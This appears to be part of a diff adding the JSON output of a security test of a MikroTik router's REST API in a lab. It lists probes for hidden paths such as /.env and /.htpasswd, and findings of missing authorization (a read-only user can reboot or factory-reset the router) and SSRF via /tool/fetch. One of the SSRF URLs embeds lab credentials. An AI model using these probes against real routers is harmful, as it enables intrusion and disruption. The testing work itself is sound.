+      "name": "Prefix: /rest/./system/resource",
+      "description": "Test endpoint with unusual prefix: /rest/./system/resource",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.169041",
+      "details": {
+        "path": "/rest/./system/resource",
+        "status": 200,
+        "body_preview": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"0\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"72925184\",\"free-memory\":\"844054528\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"935649"
+      }
+    },
+    {
+      "id": 179,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest//system/resource",
+      "description": "Test endpoint with unusual prefix: /rest//system/resource",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.169041",
+      "details": {
+        "path": "/rest//system/resource",
+        "status": 400,
+        "body_preview": "{\"detail\":\"ambiguous input ()\",\"error\":400,\"message\":\"Bad Request\"}"
+      }
+    },
+    {
+      "id": 180,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /REST/system/resource",
+      "description": "Test endpoint with unusual prefix: /REST/system/resource",
+      "result": "HTTP 404",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.173039",
+      "details": {
+        "path": "/REST/system/resource",
+        "status": 404,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+      }
+    },
+    {
+      "id": 181,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /Rest/System/Resource",
+      "description": "Test endpoint with unusual prefix: /Rest/System/Resource",
+      "result": "HTTP 404",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.173039",
+      "details": {
+        "path": "/Rest/System/Resource",
+        "status": 404,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+      }
+    },
+    {
+      "id": 182,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest/system/resource/",
+      "description": "Test endpoint with unusual prefix: /rest/system/resource/",
+      "result": "HTTP 500",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.177037",
+      "details": {
+        "path": "/rest/system/resource/",
+        "status": 500,
+        "body_preview": "{\"error\":500,\"message\":\"Internal Server Error\"}"
+      }
+    },
+    {
+      "id": 183,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest/system/resource?",
+      "description": "Test endpoint with unusual prefix: /rest/system/resource?",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.177037",
+      "details": {
+        "path": "/rest/system/resource?",
+        "status": 200,
+        "body_preview": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"0\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"72925184\",\"free-memory\":\"844054528\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"935649"
+      }
+    },
+    {
+      "id": 184,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest/system/resource#fragment",
+      "description": "Test endpoint with unusual prefix: /rest/system/resource#fragment",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.181035",
+      "details": {
+        "path": "/rest/system/resource#fragment",
+        "status": 200,
+        "body_preview": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"0\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"72925184\",\"free-memory\":\"844054528\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"935649"
+      }
+    },
+    {
+      "id": 185,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /.git/config",
+      "description": "Probe for hidden file at /.git/config",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.181035",
+      "details": {
+        "path": "/.git/config",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 186,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /.env",
+      "description": "Probe for hidden file at /.env",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.185033",
+      "details": {
+        "path": "/.env",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 187,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /.htaccess",
+      "description": "Probe for hidden file at /.htaccess",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.189031",
+      "details": {
+        "path": "/.htaccess",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 188,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /.htpasswd",
+      "description": "Probe for hidden file at /.htpasswd",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.189031",
+      "details": {
+        "path": "/.htpasswd",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 189,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /robots.txt",
+      "description": "Probe for hidden file at /robots.txt",
+      "result": "HTTP 200, size=27",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.193029",
+      "details": {
+        "path": "/robots.txt",
+        "status": 200,
+        "size": 27,
+        "body_preview": "User-agent: *\nDisallow: /\n\n"
+      }
+    },
+    {
+      "id": 190,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /sitemap.xml",
+      "description": "Probe for hidden file at /sitemap.xml",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.197027",
+      "details": {
+        "path": "/sitemap.xml",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 191,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /crossdomain.xml",
+      "description": "Probe for hidden file at /crossdomain.xml",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.197027",
+      "details": {
+        "path": "/crossdomain.xml",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 192,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /favicon.ico",
+      "description": "Probe for hidden file at /favicon.ico",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.201025",
+      "details": {
+        "path": "/favicon.ico",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 193,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /server-status",
+      "description": "Probe for hidden file at /server-status",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.201025",
+      "details": {
+        "path": "/server-status",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 194,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /server-info",
+      "description": "Probe for hidden file at /server-info",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.205023",
+      "details": {
+        "path": "/server-info",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 195,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /phpinfo.php",
+      "description": "Probe for hidden file at /phpinfo.php",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.205023",
+      "details": {
+        "path": "/phpinfo.php",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 196,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /info.php",
+      "description": "Probe for hidden file at /info.php",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.209021",
+      "details": {
+        "path": "/info.php",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 197,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /.well-known/security.txt",
+      "description": "Probe for hidden file at /.well-known/security.txt",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.209021",
+      "details": {
+        "path": "/.well-known/security.txt",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 198,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /webfig/config.js",
+      "description": "Probe for hidden file at /webfig/config.js",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.213019",
+      "details": {
+        "path": "/webfig/config.js",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 199,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /webfig/debug.js",
+      "description": "Probe for hidden file at /webfig/debug.js",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.217017",
+      "details": {
+        "path": "/webfig/debug.js",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 200,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /webfig/app.config",
+      "description": "Probe for hidden file at /webfig/app.config",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.217017",
+      "details": {
+        "path": "/webfig/app.config",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 201,
+      "category": "hidden_endpoints",
+      "name": "WebFig hidden: /winbox/",
+      "description": "Probe for hidden file at /winbox/",
+      "result": "HTTP 404, size=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.221015",
+      "details": {
+        "path": "/winbox/",
+        "status": 404,
+        "size": 99,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 202,
+      "category": "hidden_endpoints",
+      "name": "Discovery summary",
+      "description": "Summary of 2 non-404 undocumented endpoints",
+      "result": "Found 2 endpoints returning non-404",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.221015",
+      "details": {
+        "discovered": [
+          {
+            "path": "/rest/env",
+            "status": 200,
+            "body_preview": "[]"
+          },
+          {
+            "path": "/rest/system/console",
+            "status": 200,
+            "body_preview": "[{\".id\":\"*1\",\"channel\":\"0\",\"default\":\"true\",\"disabled\":\"false\",\"free\":\"true\",\"term\":\"linux\",\"vcno\":\"1\"}]"
+          }
+        ]
+      }
+    }
+  ],
+  "findings": [
+    {
+      "id": 1,
+      "severity": "MEDIUM",
+      "title": "Read-only user can access /user",
+      "description": "User 'testread' (group=read) can GET /user (HTTP 200)",
+      "timestamp": "2026-02-16T01:20:48.749781",
+      "cwe": "CWE-862"
+    },
+    {
+      "id": 2,
+      "severity": "MEDIUM",
+      "title": "Read-only user can access /ppp/secret",
+      "description": "User 'testread' (group=read) can GET /ppp/secret (HTTP 200)",
+      "timestamp": "2026-02-16T01:20:48.909701",
+      "cwe": "CWE-862"
+    },
+    {
+      "id": 3,
+      "severity": "CRITICAL",
+      "title": "Non-admin user can Reboot router",
+      "description": "User 'testread' (read) can POST /system/reboot",
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "cwe": "CWE-269",
+      "cvss_estimate": 9.0
+    },
+    {
+      "id": 4,
+      "severity": "CRITICAL",
+      "title": "Non-admin user can Shutdown router",
+      "description": "User 'testread' (read) can POST /system/shutdown",
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "cwe": "CWE-269",
+      "cvss_estimate": 9.0
+    },
+    {
+      "id": 5,
+      "severity": "CRITICAL",
+      "title": "Non-admin user can Shutdown router",
+      "description": "User 'testwrite' (write) can POST /system/shutdown",
+      "timestamp": "2026-02-16T01:20:49.437437",
+      "cwe": "CWE-269",
+      "cvss_estimate": 9.0
+    },
+    {
+      "id": 6,
+      "severity": "CRITICAL",
+      "title": "Non-admin user can Factory reset",
+      "description": "User 'testread' (read) can POST /system/reset-configuration",
+      "timestamp": "2026-02-16T01:20:49.481415",
+      "cwe": "CWE-269",
+      "cvss_estimate": 9.0
+    },
+    {
+      "id": 7,
+      "severity": "CRITICAL",
+      "title": "Non-admin user can Factory reset",
+      "description": "User 'testwrite' (write) can POST /system/reset-configuration",
+      "timestamp": "2026-02-16T01:20:49.485413",
+      "cwe": "CWE-269",
+      "cvss_estimate": 9.0
+    },
+    {
+      "id": 8,
+      "severity": "HIGH",
+      "title": "SSRF via /tool/fetch \u2014 ipv6_loopback",
+      "description": "/tool/fetch accepted URL http://[::1]/ and returned content: [{'.section': '0', 'downloaded': '1', 'duration': '0s', 'status': 'finished', 'total': '1'}]",
+      "timestamp": "2026-02-16T01:22:08.669801",
+      "cwe": "CWE-918",
+      "cvss_estimate": 7.5
+    },
+    {
+      "id": 9,
+      "severity": "HIGH",
+      "title": "SSRF via /tool/fetch \u2014 redirect_test",
+      "description": "/tool/fetch accepted URL http://127.0.0.1:80/ and returned content: [{'.section': '0', 'status': 'requesting'}, {'.section': '1', 'downloaded': '1', 'duration': '1s', 'status': 'finished', 'total': '1'}]",
+      "timestamp": "2026-02-16T01:22:15.706281",
+      "cwe": "CWE-918",
+      "cvss_estimate": 7.5
+    },
+    {
+      "id": 10,
+      "severity": "HIGH",
+      "title": "SSRF via /tool/fetch \u2014 url_with_creds",
+      "description": "/tool/fetch accepted URL http://admin:TestPass123@127.0.0.1/rest/user and returned content: [{'.section': '0', 'status': 'requesting'}, {'.section': '1', 'downloaded': '24', 'duration': '1s', 'status': 'finished', 'total': '24'}]",
+      "timestamp": "2026-02-16T01:22:17.749259",
+      "cwe": "CWE-918",
+      "cvss_estimate": 7.5
+    },
+    {
+      "id": 11,
+      "severity": "MEDIUM",
+      "title": "Undocumented endpoint discovered: /rest/env",
+      "description": "GET /rest/env returns HTTP 200 with content",
+      "timestamp": "2026-02-16T01:22:50.137057",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": 12,
+      "severity": "MEDIUM",
+      "title": "Undocumented endpoint discovered: /rest/system/console",
+      "description": "GET /rest/system/console returns HTTP 200 with content",
+      "timestamp": "2026-02-16T01:22:50.149051",
+      "cwe": "CWE-200"
+    }
+  ]
+}
